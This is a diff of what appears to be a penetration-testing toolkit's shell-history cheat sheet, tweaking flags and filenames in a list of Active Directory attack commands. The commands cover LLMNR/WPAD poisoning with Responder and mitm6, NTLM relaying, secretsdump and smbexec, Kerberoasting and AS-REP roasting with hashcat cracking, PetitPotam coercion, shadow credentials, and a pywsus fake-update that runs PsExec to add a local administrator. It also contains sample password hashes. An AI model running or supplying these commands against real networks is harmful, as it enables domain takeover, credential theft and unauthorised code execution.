@@ -1,5 +1,5 @@
 responder --interface eth0 --analyze --disable-ess
-responder --interface eth0 --NBTNSdomain --wpad --lm --disable-ess
+responder --interface eth0 --wpad --lm --disable-ess
 responder-http-off
 responder-http-on
 responder-smb-off
@@ -35,7 +35,7 @@ pth-net rpc group addmem 'Domain admins' 'Shutdown' -U 'BREAKING.BAD'/'Administr
 cme smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
 mitm6 --interface eth0
 mitm6 --interface eth0 --domain BREAKING.BAD
-responder --interface eth0 --wpad --lm --ProxyAuth
+responder --interface eth0 --wpad --lm --ProxyAuth --disable-ess
 ntlmrelayx -tf targets.txt -w -6 -smb2support -socks
 proxychains secretsdump -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
 proxychains smbexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
@@ -127,8 +127,8 @@ hashcat --status --hash-type 18200 --attack-mode 0 ASREProastables.txt `fzf-word
 john --wordlist=`fzf-wordlists` ASREProastables.txt
 GetUserSPNs.py -outputfile Kerberoastables.txt -dc-ip 192.168.56.101 BREAKING.BAD/anonymous:anonymous
 GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 -dc-ip 192.168.56.101 BREAKING.BAD/Administrator
-hashcat --status --hash-type 13100 --attack-mode 0 kerberoastables.txt `fzf-wordlists`
-john --format=krb5tgs --wordlist=`fzf-wordlists` kerberoastables.txt
+hashcat --status --hash-type 13100 --attack-mode 0 Kerberoastables.txt `fzf-wordlists`
+john --format=krb5tgs --wordlist=`fzf-wordlists` Kerberoastables.txt
 polenum -u anonymous -p anonymous -d DC01.BREAKING.BAD
 cme smb 192.168.56.101 -u '' -p '' --pass-pol
 addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios BREAKING.BAD 'BREAKING.BAD/anonymous:anonymous'
@@ -145,7 +145,7 @@ secretsdump -k SV01.BREAKING.BAD
 hashcat --status --hash-type 1000 --attack-mode 0 --username BREAKING.BAD.ntds `fzf-wordlists`
 hashcat --hash-type 1000 --potfile-path BREAKING.BAD.ntds.cracked BREAKING.BAD.ntds --show --username
 cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --asreproast ASREProastables.txt --kdcHost 192.168.56.101
-cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting kerberoastables.txt --kdcHost 192.168.56.101
+cme ldap 192.168.56.101 -d BREAKING.BAD -u anonymous -p anonymous --kerberoasting Kerberoastables.txt --kdcHost 192.168.56.101
 ldapsearch -x -h 192.168.56.101 -D '' -w '' -b "dc=BREAKING,dc=BAD"
 addspn.py -u 'BREAKING\SV01$' -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 -s HOST/SHUTDOWN.BREAKING.BAD --additional DC01.BREAKING.BAD
 dnstool.py -u 'BREAKING\SV01$' -p aad3b435b51404eeaad3b435b51404ee:c1c635aa12ae60b7fe39e28456a7bac6 -r SHUTDOWN.BREAKING.BAD -d 192.168.56.1 --action add DC01.BREAKING.BAD
@@ -214,7 +214,7 @@ hcxhashtool -i dump.hashcat --info stdout
 hashcat --hash-type 16800 --attack-mode 0 dump_WPA-PMKID-PBKDF2.hashcat `fzf-wordlists`
 hcxpcapngtool --all -o dump.hashcat dump.pcapng
 hashcat --hash-type 22000 --attack-mode 0 dump_WPA-PBKDF2-PMKID_EAPOL.hashcat `fzf-wordlists`
-responder --interface eth0 --analyze --lm
+responder --interface eth0 --analyze --lm --disable-ess
 ntlmv1-multi --ntlmv1 SV01$::BREAKING.BAD:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:1122334455667788
 airmon-ng start wlan1
 airodump-ng wlan1
@@ -300,7 +300,7 @@ getnthash.py -key '8eb7a6388780dd52eb358769dc53ff685fd135f89c4ef55abb277d7d98995
 petitpotam.py 192.168.56.1 dc01.breaking.bad
 petitpotam.py -d breaking.bad -u someaccount -p somepassword 192.168.56.1 dc01.breaking.bad
 ntlmrelayx -t ldap://dc02.breaking.bad -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
-targetedKerberoast.py -v -d domain.local -u user1 -p complexpassword -o kerberoastables.txt
+targetedKerberoast.py -v -d domain.local -u user1 -p complexpassword -o Kerberoastables.txt
 pass-station search tomcat
 nth --text 5f4dcc3b5aa765d61d8327deb882cf99
 pywsus.py --host 192.168.56.1 --port 8530 --executable /opt/resources/windows/sysinternals/PsExec64.exe --command '/accepteula /s cmd.exe /c "net localgroup Administrators DOMAIN\controlleduser /add"'
